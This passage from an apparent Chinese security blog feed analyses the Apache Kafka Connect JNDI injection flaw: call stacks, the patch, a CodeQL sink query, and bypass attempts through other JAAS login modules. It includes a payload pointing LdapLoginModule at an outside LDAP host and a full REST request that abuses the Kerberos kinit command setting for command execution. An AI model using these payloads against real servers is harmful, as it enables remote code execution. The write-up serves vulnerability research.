class="line">build:1255, Worker$TaskBuilder (org.apache.kafka.connect.runtime)</span><br><span class="line">startTask:672, Worker (org.apache.kafka.connect.runtime)</span><br><span class="line">startSourceTask:567, Worker (org.apache.kafka.connect.runtime)</span><br><span class="line">startTask:397, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">createConnectorTasks:381, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">createConnectorTasks:375, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">updateConnectorTasks:432, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">lambda$putConnectorConfig$2:232, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br></pre></td></tr></table></figure><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p><a href="https://github.com/apache/kafka/commit/1ed61e4090353bc9e4802ee09366f512dc60884f">https://github.com/apache/kafka/commit/1ed61e4090353bc9e4802ee09366f512dc60884f</a></p><p><img src="/images/pasted-842.png" alt="upload successful"></p><p>增加了配置-Dorg.apache.kafka.disallowed.login.modules，默认值为com.sun.security.auth.module.JndiLoginModule，在JaasContext#load 中通过throwIfLoginModuleIsNotAllowed 检测。</p><h3 id="LdapLoginModule"><a href="#LdapLoginModule" class="headerlink" title="LdapLoginModule"></a>LdapLoginModule</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">initialize:392, LdapLoginModule (com.sun.security.auth.module)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">invoke:736, LoginContext (javax.security.auth.login)</span><br><span class="line">access$000:195, LoginContext (javax.security.auth.login)</span><br><span class="line">run:682, LoginContext$4 (javax.security.auth.login)</span><br><span class="line">run:680, LoginContext$4 (javax.security.auth.login)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">invokePriv:680, LoginContext (javax.security.auth.login)</span><br><span class="line">login:587, LoginContext (javax.security.auth.login)</span><br><span class="line">login:60, AbstractLogin (org.apache.kafka.common.security.authenticator)</span><br><span class="line">&lt;init&gt;:62, LoginManager (org.apache.kafka.common.security.authenticator)</span><br><span class="line">acquireLoginManager:105, LoginManager (org.apache.kafka.common.security.authenticator)</span><br><span class="line">configure:170, SaslChannelBuilder (org.apache.kafka.common.network)</span><br><span class="line">create:192, ChannelBuilders (org.apache.kafka.common.network)</span><br><span class="line">clientChannelBuilder:81, ChannelBuilders (org.apache.kafka.common.network)</span><br><span class="line">createChannelBuilder:105, ClientUtils (org.apache.kafka.clients)</span><br><span class="line">newSender:517, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:460, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:291, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">&lt;init&gt;:274, KafkaProducer (org.apache.kafka.clients.producer)</span><br><span class="line">doBuild:1348, Worker$SourceTaskBuilder (org.apache.kafka.connect.runtime)</span><br><span class="line">build:1255, Worker$TaskBuilder (org.apache.kafka.connect.runtime)</span><br><span class="line">startTask:672, Worker (org.apache.kafka.connect.runtime)</span><br><span class="line">startSourceTask:567, Worker (org.apache.kafka.connect.runtime)</span><br><span class="line">startTask:397, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">createConnectorTasks:381, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">createConnectorTasks:375, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">updateConnectorTasks:432, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">lambda$null$2:232, StandaloneHerder (org.apache.kafka.connect.runtime.standalone)</span><br><span class="line">run:-1, 1958436348 (org.apache.kafka.connect.runtime.standalone.StandaloneHerder$$Lambda$426)</span><br><span class="line">call:511, Executors$RunnableAdapter (java.util.concurrent)</span><br><span class="line">run:266, FutureTask (java.util.concurrent)</span><br><span class="line">access$201:180, ScheduledThreadPoolExecutor$ScheduledFutureTask (java.util.concurrent)</span><br><span class="line">run:293, ScheduledThreadPoolExecutor$ScheduledFutureTask (java.util.concurrent)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:750, Thread (java.lang)</span><br></pre></td></tr></table></figure><p>无法绕过password != null</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">attemptAuthentication</span><span class="params">(<span class="keyword">boolean</span> getPasswdFromSharedState)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> LoginException </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// first get the username and password</span></span><br><span class="line">    getUsernamePassword(getPasswdFromSharedState);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (password == <span class="keyword">null</span> || password.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> (LoginException)</span><br><span class="line">            <span class="keyword">new</span> FailedLoginException(<span class="string">&quot;No password was supplied&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><ol><li>debezium mysql 横向，azure貌似也有用到</li><li>kafka connector 参数可控是通用问题，配合pyn3rd师傅的 jdbc系列，是个不错的攻击面</li><li>connectorconfig 到workerconfig，再到producerconfig，这个流程是关键</li><li>rest api 通用问题，配置文件rce 也有了用武之地</li></ol><p>拓展<br>还有哪些LoginModule 的实现类，其login是可能存在问题的？</p><h3 id="5-1-总结"><a href="#5-1-总结" class="headerlink" title="5.1 总结"></a>5.1 总结</h3><h4 id="5-1-1-Sink点：LoginContext-login"><a href="#5-1-1-Sink点：LoginContext-login" class="headerlink" title="5.1.1 Sink点：LoginContext#login"></a>5.1.1 Sink点：LoginContext#login</h4><p>最终的Sink点是LdapLoginModule#login，对应的interface 是LoginModule#login，更上一级别通用的接口是LoginContext#login</p><p><img src="/images/pasted-573.png" alt="upload successful"></p><p>sink 点 LoginContext#login，其中</p><ol><li>LoginContext 初始化方法参数configuration 需要可控</li></ol><blockquote><p>LoginContext 的继承类呢</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class JAASLoginSinkMethod extends DataFlow::Node &#123;</span><br><span class="line">    JAASLoginSinkMethod() &#123;</span><br><span class="line">        exists( </span><br><span class="line">            ConstructorCall cc|</span><br><span class="line">            cc.getConstructor().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;LoginContext&quot;)</span><br><span class="line">            and this.asExpr() &#x3D; cc.getArgument(3)</span><br><span class="line">            &#x2F;&#x2F; and this.asExpr() &#x3D; cc</span><br><span class="line">            and cc.getNumArgument() &#x3D; 4</span><br><span class="line">            and not cc.getLocation().getFile().getRelativePath().matches(&quot;%&#x2F;src&#x2F;test&#x2F;%&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-1-2-Sink-KafkaProducer"><a href="#5-1-2-Sink-KafkaProducer" class="headerlink" title="5.1.2 Sink: KafkaProducer"></a>5.1.2 Sink: KafkaProducer</h4><p>KafkaProducer#&lt;init&gt; config 参数可控情况下，也是sink</p><p><img src="/images/pasted-572.png" alt="upload successful"></p><h3 id="5-2-横向发现"><a href="#5-2-横向发现" class="headerlink" title="5.2 横向发现"></a>5.2 横向发现</h3><h4 id="5-2-1-LdapLoginModule"><a href="#5-2-1-LdapLoginModule" class="headerlink" title="5.2.1 LdapLoginModule"></a>5.2.1 LdapLoginModule</h4><p>除了LdapLoginModule， 还有哪些LoginModule的实现类</p><p>在jdk中，有</p><ol><li>com.sun.security.auth.module<ul><li>JndiLoginModule</li><li>KeyStoreLoginModule</li><li>Krb5LoginModule</li><li>LdapLoginModule</li><li>UnixLoginModule</li></ul></li><li>com.sun.jmx.remote.security<ul><li>FileLoginModule</li></ul></li><li>在Kafka common security<ul><li>PlainLoginModule</li><li>PropertyFileLoginModule</li><li>ScramLoginModule</li><li>DigestLoginModule</li></ul></li></ol><p>经验证，这些类中，有么无sink点，有sink点的除了JndiLoginModule，其余的都有filter验证账号密码，导致无法执行到最终的sink点，虽然有一些绕过的方式，但是在Kafka JaasContext中有严格的过滤，导致无法绕过。以下为发现的尝试：</p><h5 id="LdapLoginModule-1"><a href="#LdapLoginModule-1" class="headerlink" title="LdapLoginModule"></a>LdapLoginModule</h5><p>用的DirContext，能够实现注入的条件：</p><ol><li>需要开启returnObj<br> SearchControls#setReturningObjFlag</li><li>DirContext#search/listBinding</li></ol><p><a href="https://github.com/vmnguyen/semgrep-rules/blob/81b81481c0a81e45d3ffba8d60dd98491a1b0446/java/default/lang/security/audit/ldap-entry-poisoning.java">https://github.com/vmnguyen/semgrep-rules/blob/81b81481c0a81e45d3ffba8d60dd98491a1b0446/java/default/lang/security/audit/ldap-entry-poisoning.java</a></p><p>&lt;–! Spring-ldap 存在这个问题 –&gt;</p><h5 id="PlainLoginModule"><a href="#PlainLoginModule" class="headerlink" title="PlainLoginModule"></a>PlainLoginModule</h5><p>PlainLoginModule 会更新覆盖subject</p><p>LoginContext invoke 中存在覆盖的可能，但是必须要支持多个jaascontext才行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;producer.override.sasl.jaas.config&quot;:  &quot;org.apache.kafka.common.security.plain.PlainLoginModule required username&#x3D;\&quot;replicator\&quot; password&#x3D;\&quot;replicator-secret\&quot;;\ncom.sun.security.auth.module.LdapLoginModule required userProvider&#x3D;\&quot;ldap:&#x2F;&#x2F;kafka3.1.dns.m0d9.me\&quot; userFilter&#x3D;\&quot;(name&#x3D;*)\&quot; authzIdentity&#x3D;\&quot;staff\&quot; debug&#x3D;\&quot;true\&quot; useSSL&#x3D;\&quot;false\&quot; tryFirstPass&#x3D;\&quot;true\&quot; serviceName&#x3D;\&quot;x\&quot; username&#x3D;\&quot;aa\&quot; password&#x3D;\&quot;aa\&quot;;&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-576.png" alt="upload successful"></p><h5 id="KeyStoreLoginModule"><a href="#KeyStoreLoginModule" class="headerlink" title="KeyStoreLoginModule"></a>KeyStoreLoginModule</h5><p>无法绕过输入，还是需要输入</p><p>除非找到一个CallbackHandler，默认给赋值，但是筛选发现不太可能了</p><p><img src="/images/pasted-575.png" alt="upload successful"></p><h6 id="CallBackHandlers"><a href="#CallBackHandlers" class="headerlink" title="CallBackHandlers"></a>CallBackHandlers</h6><p>SaslChannelBuilder.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> <span class="keyword">throws</span> KafkaException </span>&#123;</span><br><span class="line">...</span><br><span class="line">createClientCallbackHandler(configs);</span><br><span class="line">...</span><br><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createClientCallbackHandler</span><span class="params">(Map&lt;String, ?&gt; configs)</span> </span>&#123;</span><br><span class="line">       <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">       Class&lt;? extends AuthenticateCallbackHandler&gt; clazz = (Class&lt;? extends AuthenticateCallbackHandler&gt;) configs.get(SaslConfigs.SASL_CLIENT_CALLBACK_HANDLER_CLASS);</span><br><span class="line">       <span class="keyword">if</span> (clazz == <span class="keyword">null</span>)</span><br><span class="line">           clazz = clientCallbackHandlerClass();</span><br><span class="line">       AuthenticateCallbackHandler callbackHandler = Utils.newInstance(clazz);</span><br><span class="line">       saslCallbackHandlers.put(clientSaslMechanism, callbackHandler);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>Utils.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">newInstance</span><span class="params">(Class&lt;T&gt; c)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> KafkaException(<span class="string">&quot;class cannot be null&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> c.getDeclaredConstructor().newInstance();</span><br></pre></td></tr></table></figure><ol><li>无参数构造函数</li><li>而且password类型的处理，不抛异常</li><li>继承AuthenticateCallbackHandler</li></ol><p>JDK</p><ul><li><input checked="" disabled="" type="checkbox"> LoginContext$SecureCallbackHandler<br>  无无参构造函数</li><li><input checked="" disabled="" type="checkbox"> NegotiateCallbackHandler<br>  PasswordCallback 抛异常</li><li><input checked="" disabled="" type="checkbox"> JMXPluggableAuthenticator$JMXCallbackHandler<br>  <img src="/images/pasted-671.png" alt="upload successful"></li><li><input checked="" disabled="" type="checkbox"> PasswordCallbackHandler<br>  无无参构造函数</li><li><input checked="" disabled="" type="checkbox"> DefaultCallbackHandler<br>  无无参构造函数</li></ul><p>Kafka</p><ul><li><input checked="" disabled="" type="checkbox"> PlainServerCallbackHandler<br>  PasswordCallback 抛异常</li><li><input checked="" disabled="" type="checkbox"> SaslClientCallbackHandler<br>  PasswordCallback 抛异常</li><li><input checked="" disabled="" type="checkbox"> SaslServerCallbackHandler<br>  无PasswordCallback，抛异常</li><li><input checked="" disabled="" type="checkbox"> KerberosClientCallbackHandler<br>  PasswordCallback 抛异常</li><li><input checked="" disabled="" type="checkbox"> OAuthBearerSaslClientCallbackHandler<br>  PasswordCallback 抛异常</li><li><input checked="" disabled="" type="checkbox"> OAuthBearerUnsecuredLoginCallbackHandler<br>  无PasswordCallback，抛异常</li><li><input checked="" disabled="" type="checkbox"> OAuthBearerUnsecuredValidatorCallbackHandler<br>  无PasswordCallback，抛异常</li><li><input checked="" disabled="" type="checkbox"> OAuthBearerLoginCallbackHandler<br>  无PasswordCallback，抛异常</li><li><input checked="" disabled="" type="checkbox"> OAuthBearerValidatorCallbackHandler<br>  无PasswordCallback，抛异常</li><li><input checked="" disabled="" type="checkbox"> PlainServerCallbackHandler<br>  无PasswordCallback，抛异常</li><li><input checked="" disabled="" type="checkbox"> ScramServerCallbackHandler<br>  无PasswordCallback，抛异常</li><li><input checked="" disabled="" type="checkbox"> BasicAuthCallBackHandler<br>  PasswordCallback 抛异常</li></ul><h4 id="5-2-2-KerberosLogin"><a href="#5-2-2-KerberosLogin" class="headerlink" title="5.2.2 KerberosLogin"></a>5.2.2 KerberosLogin</h4><h5 id="KerberosLogin"><a href="#KerberosLogin" class="headerlink" title="KerberosLogin"></a>KerberosLogin</h5><p>KerberosLogin 这里存在sink点</p><p>Shell.execCommand(kinitCmd, kinitArgs);</p><p>kinitCmd 可以从输入中获取</p><p>sasl.kerberos.kinit.cmd</p><p><a href="https://kafka.apache.org/documentation/#consumerapi">https://kafka.apache.org/documentation/#consumerapi</a></p><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ol><li>需要配置好kerberos 服务</li><li>windows</li></ol><p><img src="/images/pasted-672.png" alt="upload successful"></p><p>kafka-client</p><ol><li>keytab file<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kadmin.local</span><br><span class="line">add_principal -randkey kafka-client@EXAMPLE.COM</span><br><span class="line">xst -k /root/kafka-client.keytab kafka-client@EXAMPLE.COM</span><br></pre></td></tr></table></figure></li><li>krb5.conf</li></ol><p>kafka-server</p><p>单独搭个fake kerberos server也行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service krb5-kdc restart</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;connectors HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8083</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;109.0.0.0 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 712</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;: &quot;test221&quot;, </span><br><span class="line">   &quot;config&quot;:&#123;</span><br><span class="line">&quot;connector.class&quot;:&quot;FileStreamSource&quot;,</span><br><span class="line">&quot;file&quot;:&quot;test.txt&quot;,</span><br><span class="line">&quot;tasks.max&quot;:&quot;1&quot;,</span><br><span class="line">&quot;topic&quot;:&quot;quickstart-events&quot;,</span><br><span class="line">&quot;producer.override.sasl.login.class&quot;: &quot;org.apache.kafka.common.security.kerberos.KerberosLogin&quot;,</span><br><span class="line">&quot;producer.override.sasl.kerberos.kinit.cmd&quot;: &quot;whomai&quot;,</span><br><span class="line">&quot;producer.override.security.protocol&quot;:&quot;SASL_PLAINTEXT&quot;,</span><br><span class="line">&quot;producer.override.sasl.mechanism&quot;:&quot;PLAIN&quot;,</span><br><span class="line">&quot;producer.override.sasl.kerberos.service.name&quot;:&quot;kerberos&quot;,</span><br><span class="line">&quot;producer.override.sasl.jaas.config&quot;:  &quot;com.sun.security.auth.module.Krb5LoginModule required useKeyTab&#x3D;true storeKey&#x3D;true keyTab&#x3D;\&quot;FILE:&#x2F;root&#x2F;kafka-client.keytab\&quot; principal&#x3D;\&quot;kafka-client@EXAMPLE.COM\&quot; useTicketCache&#x3D;true;&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在Windows下可以通过smb 加载远程URL</p><h4 id="5-2-3-ExternalCommandSpec"><a href="#5-2-3-ExternalCommandSpec" class="headerlink" title="5.2.3 ExternalCommandSpec"></a>5.2.3 ExternalCommandSpec</h4><p>org.apache.kafka.trogdor.workload.ExternalCommandSpec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;bin&#x2F;trogdor.sh client createTask -t localhost:8889 -i produce0 --spec .&#x2F;tests&#x2F;spec&#x2F;external_command.json</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-673.png" alt="upload successful"></p><h4 id="5-2-4-Others"><a href="#5-2-4-Others" class="headerlink" title="5.2.4 Others"></a>5.2.4 Others</h4><p>org.apache.activemq.jaas.LDAPLoginModule</p><ul><li>过不了username 为空</li></ul><p>org.apache.catalina.realm.JAASMemoryLoginModule<br>org.apache.karaf.jaas.modules.jdbc.JDBCLoginModule<br>org.apache.karaf.jaas.modules.ldap.LDAPLoginModule</p><p>org.apache.openejb.core.security.jaas.SQLLoginModule<br>org.apache.openejb.core.security.jaas.ScriptLoginModule</p><p>org.apache.geronimo.security.realm.providers.LDAPLoginModule<br>org.apache.geronimo.security.realm.providers.KerberosLoginModule<br>org.apache.geronimo.security.realm.providers.SQLLoginModule<br>org.apache.geronimo.security.credentialstore.RunAsLoginModule</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><ul><li>[1] <a href="https://kafka.apache.org/cve-list">https://kafka.apache.org/cve-list</a></li><li>[2] <a href="https://hackerone.com/reports/1529790">https://hackerone.com/reports/1529790</a></li><li>[3] <a href="https://github.com/ohnonoyesyes/CVE-2023-25194">https://github.com/ohnonoyesyes/CVE-2023-25194</a></li><li>[4] <a href="https://kafka.apache.org/documentation/#connect_rest">https://kafka.apache.org/documentation/#connect_rest</a></li><li>[5] <a href="https://docs.confluent.io/kafka-connectors/debezium-mysql-source/current/mysql_source_connector_config.html#signal-parameters">https://docs.confluent.io/kafka-connectors/debezium-mysql-source/current/mysql_source_connector_config.html#signal-parameters</a></li><li>[6] <a href="https://kafka.apache.org/quickstart">https://kafka.apache.org/quickstart</a></li><li>[7] <a href="https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz">https://lists.apache.org/thread/vy1c7fqcdqvq5grcqp6q5jyyb302khyz</a></li><li>[8] <a href="https://nox.qianxin.com/article/518">https://nox.qianxin.com/article/518</a></li><li>[9] <a href="https://juejin.cn/post/7031117859539550245">kafka使用kerberos协议踩坑实录</a></li><li>[10] <a href="https://www.cnblogs.com/wuyongyin/p/15634397.html">Kerberos 入门实战(2)–Kerberos 安装及使用</a></li><li>[11] <a href="https://zhuanlan.zhihu.com/p/37168236">独辟蹊径：如何通过URL文件实现DLL劫持</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;漏洞的原理不复杂，背后的故事却很有意思。&lt;/p&gt;
&lt;h2 id=&quot;0x01-漏洞趣闻&quot;&gt;&lt;a href=&quot;#0x01-漏洞趣闻&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞趣闻&quot;&gt;&lt;/a&gt;0x01 漏洞趣闻&lt;/h2&gt;&lt;p&gt;有意思的Credit，&lt;br&gt;&lt;img src=&quot;/images/pasted-401.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;大致理理时间线&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;2022.04.04——jarij 在hackone上报给了个漏洞给Aiven Ltd，具体参考 &lt;a href=&quot;https://hackerone.com/reports/1529790%E3%80%82Aiven&quot;&gt;https://hackerone.com/reports/1529790。Aiven&lt;/a&gt; 是一个云服务器提供商，包装了kafka产品，用到了debezium mysql的connector，都知道mysql jdbc connector参数如果能控制是有反序列化风险的，但这里漏洞还不是这个触发点，而是database.history.producer.sasl.jaas.config这个参数可以指定JndiLoginModule 造成JNDI 注入。&lt;/li&gt;
&lt;li&gt;2022.11.08——漏洞详情公开。&lt;/li&gt;
&lt;li&gt;(时间未知)——4ra1n 和Y4tacker 两位师傅找到了个Apache 其他产品的漏洞，和kafka有关，最终定位为kafka的问题（细节未确认）&lt;/li&gt;
&lt;li&gt;2023.02.08——Kafka CVE公告，参考&lt;a href=&quot;https://kafka.apache.org/cve-list&quot;&gt;https://kafka.apache.org/cve-list&lt;/a&gt; ，官方也给出了poc的重要参数xxx.overwrite.sasl.jaas.config。&lt;/li&gt;
&lt;li&gt;2023.02.09——奇安信复现 &lt;a href=&quot;https://nox.qianxin.com/article/518%E3%80%82&quot;&gt;https://nox.qianxin.com/article/518。&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Apache" scheme="http://m0d9.me/tags/Apache/"/>
    
    <category term="JNDI" scheme="http://m0d9.me/tags/JNDI/"/>
    
    <category term="Kafka" scheme="http://m0d9.me/tags/Kafka/"/>
    
    <category term="Jaas" scheme="http://m0d9.me/tags/Jaas/"/>
    
  </entry>
  
  <entry>
    <title>Tabby 源码分析</title>
    <link href="http://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2022/10/22/Tabby-%E5%B7%A5%E5%85%B7%E5%88%86%E6%9E%90/</id>
    <published>2022-10-22T08:27:00.000Z</published>
    <updated>2023-07-21T03:11:09.158Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>与GadgetInspector 类似，Tabby 也是通过污点分析来实现的Gadget Chain挖掘。不同的是</p><ul><li>Tabby 用soot 来做的静态污点分析，GadgetInspector 是用的ASM 模拟来做的污点跟踪</li><li>用了Neo4j来做CPG 的查询与展示，要灵活很多</li><li>优化了污点传播关系</li></ul><p>据说Tabby 一开始是wh1t3p1g师傅的毕设，不过当时没放出tabby-path-finder，因此一直没太关注Tabby 污点分析这块，都是用手动白名单来做过滤的。KCon上师傅的PPT，收获很多，学习总结下。这里主要关注</p><ol><li>Tabby 污点传播规则</li><li>Tabby soot 污点分析的实现</li><li>Tabby Neo4j 搜索实现</li></ol><p>注：本文需要对soot 有一定了解，参考fynch3r 师傅的参考【3】。</p><h2 id="0x02-Soot-数据流分析"><a href="#0x02-Soot-数据流分析" class="headerlink" title="0x02 Soot 数据流分析"></a>0x02 Soot 数据流分析</h2><p>四步走：</p><p><img src="/images/pasted-320.png" alt="upload successful"></p><a id="more"></a><p>具体实现：</p><p><img src="/images/pasted-322.png" alt="upload successful"></p><ul><li>必须继承FlowAnalysis抽象类</li><li>实现抽象方法 merge() and copy()</li><li>实现数据流分析函数：flowThrough()</li><li>实现初始化函数：newInitialFlow() and entryInitialFlow()</li><li>框架的构造函数内必须调用 doAnalysis()</li></ul><p>必备知识：</p><ul><li>UnitGraph 是语句图，结点是Units。</li><li>BlockGraph 是基本控制流图，结点由基本块BasicBlocks组成。</li></ul><h3 id="2-1-FlowSet"><a href="#2-1-FlowSet" class="headerlink" title="2.1 FlowSet"></a>2.1 FlowSet</h3><p>在soot中，flow sets 代表control-flow-graph 中与节点相关的数据集合。</p><p>CFG中的每个节点，都有一个flowset与之关联。</p><ul><li>有边界：需要实现BoundedFlowSet接口，知道所有可能值，适合指针分析</li><li>无边界：需要实现FlowSet接口，不知道所有可能值</li></ul><h4 id="2-1-1-接口"><a href="#2-1-1-接口" class="headerlink" title="2.1.1 接口"></a>2.1.1 接口</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FlowSet&lt;T&gt; <span class="title">clone</span><span class="params">()</span></span>; <span class="comment">//克隆当前FlowSet的集合</span></span><br><span class="line"><span class="function">FlowSet&lt;T&gt; <span class="title">emptySet</span><span class="params">()</span></span>;<span 